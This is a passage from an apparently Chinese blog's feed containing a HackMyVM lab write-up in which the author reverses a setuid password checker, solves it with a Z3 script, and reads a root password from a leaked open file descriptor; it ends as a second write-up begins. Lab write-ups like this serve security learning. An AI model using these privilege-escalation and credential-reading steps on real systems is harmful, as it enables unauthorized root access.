  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>先是用checkPasswd检测输入的第一个密码，如果满足打开&#x2F;opt&#x2F;root.pass，setuid为0，然后输入第二个密码，如果与<code>ultrasecretpassword</code>相等，执行<code>/bin/sh sh</code>拿到root的shell，否则bye结束<br>那先看<code>checkPasswd</code></p>
<pre class="language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">checkPasswd</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">26</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">10</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>
          <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10100</span> <span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">219</span> <span class="token punctuation">)</span>
              <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">11</span> <span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">10</span> <span class="token punctuation">)</span>
                  <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11845</span> <span class="token punctuation">)</span>
                    <span class="token punctuation">&#123;</span>
                      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">7</span> <span class="token punctuation">)</span>
                      <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
                        <span class="token punctuation">&#123;</span>
                          <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9797</span> <span class="token punctuation">)</span>
                          <span class="token punctuation">&#123;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
                            <span class="token punctuation">&#123;</span>
                              <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11252</span> <span class="token punctuation">)</span>
                              <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>
                                <span class="token punctuation">&#123;</span>
                                  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
                                  <span class="token punctuation">&#123;</span>
                                    <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">5</span> <span class="token punctuation">)</span>
                                    <span class="token punctuation">&#123;</span>
                                      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10815</span> <span class="token punctuation">)</span>
                                      <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>
                                        <span class="token punctuation">&#123;</span>
                                          <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token operator">*</span>a1 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">8</span> <span class="token punctuation">)</span>
                                          <span class="token punctuation">&#123;</span>
                                            <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
                                            <span class="token punctuation">&#123;</span>
                                              <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">220</span> <span class="token punctuation">)</span>
                                              <span class="token punctuation">&#123;</span>
                                                <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token punctuation">)</span>
                                                <span class="token punctuation">&#123;</span>
                                                  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
                                                  <span class="token punctuation">&#123;</span>
                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12654</span> <span class="token punctuation">)</span>
                                                    <span class="token punctuation">&#123;</span>
                                                      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">15</span> <span class="token punctuation">)</span>
                                                      <span class="token punctuation">&#123;</span>
                                                        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Correct pass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                                        <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
                                                      <span class="token punctuation">&#125;</span>
                                                      <span class="token keyword">else</span>
                                                      <span class="token punctuation">&#123;</span>
                                                        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                                      <span class="token punctuation">&#125;</span>
                                                    <span class="token punctuation">&#125;</span>
                                                    <span class="token keyword">else</span>
                                                    <span class="token punctuation">&#123;</span>
                                                      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                                    <span class="token punctuation">&#125;</span>
                                                  <span class="token punctuation">&#125;</span>
                                                  <span class="token keyword">else</span>
                                                  <span class="token punctuation">&#123;</span>
                                                    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                                  <span class="token punctuation">&#125;</span>
                                                <span class="token punctuation">&#125;</span>
                                                <span class="token keyword">else</span>
                                                <span class="token punctuation">&#123;</span>
                                                  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                                <span class="token punctuation">&#125;</span>
                                              <span class="token punctuation">&#125;</span>
                                              <span class="token keyword">else</span>
                                              <span class="token punctuation">&#123;</span>
                                                <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                              <span class="token punctuation">&#125;</span>
                                            <span class="token punctuation">&#125;</span>
                                            <span class="token keyword">else</span>
                                            <span class="token punctuation">&#123;</span>
                                              <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                            <span class="token punctuation">&#125;</span>
                                          <span class="token punctuation">&#125;</span>
                                          <span class="token keyword">else</span>
                                          <span class="token punctuation">&#123;</span>
                                            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                          <span class="token punctuation">&#125;</span>
                                        <span class="token punctuation">&#125;</span>
                                        <span class="token keyword">else</span>
                                        <span class="token punctuation">&#123;</span>
                                          <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                        <span class="token punctuation">&#125;</span>
                                      <span class="token punctuation">&#125;</span>
                                      <span class="token keyword">else</span>
                                      <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                      <span class="token punctuation">&#125;</span>
                                    <span class="token punctuation">&#125;</span>
                                    <span class="token keyword">else</span>
                                    <span class="token punctuation">&#123;</span>
                                      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                    <span class="token punctuation">&#125;</span>
                                  <span class="token punctuation">&#125;</span>
                                  <span class="token keyword">else</span>
                                  <span class="token punctuation">&#123;</span>
                                    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                  <span class="token punctuation">&#125;</span>
                                <span class="token punctuation">&#125;</span>
                                <span class="token keyword">else</span>
                                <span class="token punctuation">&#123;</span>
                                  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                <span class="token punctuation">&#125;</span>
                              <span class="token punctuation">&#125;</span>
                              <span class="token keyword">else</span>
                              <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                              <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">&#125;</span>
                            <span class="token keyword">else</span>
                            <span class="token punctuation">&#123;</span>
                              <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                          <span class="token punctuation">&#125;</span>
                          <span class="token keyword">else</span>
                          <span class="token punctuation">&#123;</span>
                            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                          <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                        <span class="token keyword">else</span>
                        <span class="token punctuation">&#123;</span>
                          <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                      <span class="token punctuation">&#125;</span>
                      <span class="token keyword">else</span>
                      <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                      <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">&#123;</span>
                      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                  <span class="token punctuation">&#125;</span>
                  <span class="token keyword">else</span>
                  <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">else</span>
                <span class="token punctuation">&#123;</span>
                  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token keyword">else</span>
              <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">&#123;</span>
              <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">else</span>
          <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Incorrect pass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>果然考的是re，用z3解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">from z3 <span class="token function">import</span> *

def check_passwd<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    a1 <span class="token operator">=</span> <span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">'a1[%d]'</span> % i<span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    constraints <span class="token operator">=</span> <span class="token punctuation">[</span>
     
        len<span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">26</span>,
        a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> -10,
        a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> + a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208</span>,
        a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span>,
        a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> -2,
        a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10100</span>,
        a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> + a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">219</span>,
        a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> -11,
        a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> -10,
        a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11845</span>,
        a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> -7,
        a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span>,
        a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9797</span>,
        a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span>,
        a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11252</span>,
        a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> -2,
        a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span>,
        a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> -5,
        a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10815</span>,
        a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> -2,
        a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> -8,
        a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4</span>,
        a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> + a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">220</span>,
        a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span>,
        a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span>,
        a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12654</span>,
        a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token parameter variable">-15</span>
    <span class="token punctuation">]</span>
    solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
    solver.add<span class="token punctuation">(</span>constraints<span class="token punctuation">)</span>
    <span class="token keyword">if</span> solver.check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat:
     
        model <span class="token operator">=</span> solver.model<span class="token punctuation">(</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> <span class="token string">""</span>.join<span class="token punctuation">(</span><span class="token punctuation">[</span>chr<span class="token punctuation">(</span>model<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>.as_long<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        print<span class="token punctuation">(</span><span class="token string">"Correct pass: "</span>, password<span class="token punctuation">)</span>
    else:
        print<span class="token punctuation">(</span><span class="token string">"Incorrect pass"</span><span class="token punctuation">)</span>

check_passwd<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>解出来<code>ihopethisisastrongpassword</code>,这就拿到第一个密码了，第二个密码又是已知</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:~$ ./pass
Passwd: ihopethisisastrongpassword                                                                                                                                                                                                                                                                                          
Correct pass                                                                                                                                                                                                                                                                                                                
Second Passwd: ultrasecretpassword                                                                                                                                                                                                                                                                                          
$ <span class="token function">id</span>                                                                                                                                                                                                                                                                                                                        
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>shimmer<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>shimmer<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>shimmer<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span> </code></pre>
<p>holyshit,为什么是shimmer的权限……<br>这里有点懵逼，看了HGBE师傅的wp，然后又看了群主的wp，原来是因为open没有关闭</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">lsof</span> /opt/root.pass
COMMAND  PID    <span class="token environment constant">USER</span>   FD   TYPE DEVICE SIZE/OFF   NODE NAME
<span class="token function">sh</span>      <span class="token number">1227</span> shimmer    3r   REG    <span class="token number">8,1</span>       <span class="token number">15</span> <span class="token number">522246</span> /opt/root.pass
$ <span class="token function">cat</span> /proc/1227/fd/3
cat: /proc/1227/fd/3: Permiso denegado
$ 
$ <span class="token builtin class-name">cd</span> /proc/1227/fd
$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">0</span>
dr-x------ <span class="token number">2</span> shimmer shimmer  <span class="token number">0</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token builtin class-name">.</span>
dr-xr-xr-x <span class="token number">9</span> shimmer shimmer  <span class="token number">0</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token punctuation">..</span>
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">0</span> -<span class="token operator">></span> /dev/pts/0
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">1</span> -<span class="token operator">></span> /dev/pts/0
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">10</span> -<span class="token operator">></span> /dev/tty
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">2</span> -<span class="token operator">></span> /dev/pts/0
lr-x------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">3</span> -<span class="token operator">></span> /opt/root.pass</code></pre>
<p>果然，当前pid还在打开这个文件，open的时候只能读一次<br>然后把他从管道里取出来，顺便测试了一下果然只能读一次</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">0</span>
dr-x------ <span class="token number">2</span> shimmer shimmer  <span class="token number">0</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token builtin class-name">.</span>
dr-xr-xr-x <span class="token number">9</span> shimmer shimmer  <span class="token number">0</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token punctuation">..</span>
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">0</span> -<span class="token operator">></span> /dev/pts/0
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">1</span> -<span class="token operator">></span> /dev/pts/0
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">10</span> -<span class="token operator">></span> /dev/tty
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">2</span> -<span class="token operator">></span> /dev/pts/0
lr-x------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">3</span> -<span class="token operator">></span> /opt/root.pass
$ <span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;3</span>
masteradmin420
$ <span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;3</span>
$ </code></pre>
<p>靶机难度还行，就最后这个open不懂，也是学到了东西。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>Z3</tag>
        <tag>open</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-CodeShield</title>
    <url>/posts/3e3f7c7d/</url>
    <content><![CDATA[<p><strong>难度:Easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.154</strong></p>
